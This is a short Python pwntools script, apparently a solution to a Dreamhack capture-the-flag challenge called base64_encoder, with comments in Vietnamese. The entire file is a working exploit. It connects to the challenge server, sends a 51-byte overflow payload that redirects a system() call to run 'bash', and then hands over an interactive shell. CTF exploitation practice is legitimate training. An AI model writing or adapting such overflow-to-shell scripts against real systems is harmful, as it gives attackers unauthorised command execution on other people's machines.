# exploit.py
from pwn import *

# p = process("./base64_encoder")   # local
p = remote("host8.dreamhack.games", 15994)

def menu_choice(x):
    p.recvuntil(b"> ")
    p.sendline(str(x).encode())

# B1: chọn encode
menu_choice(1)

# B2: gửi 51 byte: 48 'A' + 0x6D 0xAB 0x21
payload = b"A"*48 + b"\x6D\xAB\x21"
p.send(payload)              # read(0, .., 0x40) không cần newline; nếu server đợi, dùng p.sendafter

# In ra kết quả encode
try:
    print(p.recvline(timeout=0.5))
except:
    pass

# B3: chọn Exit để gọi system(local_38) == "bash"
menu_choice(2)

# B4: có shell
p.interactive()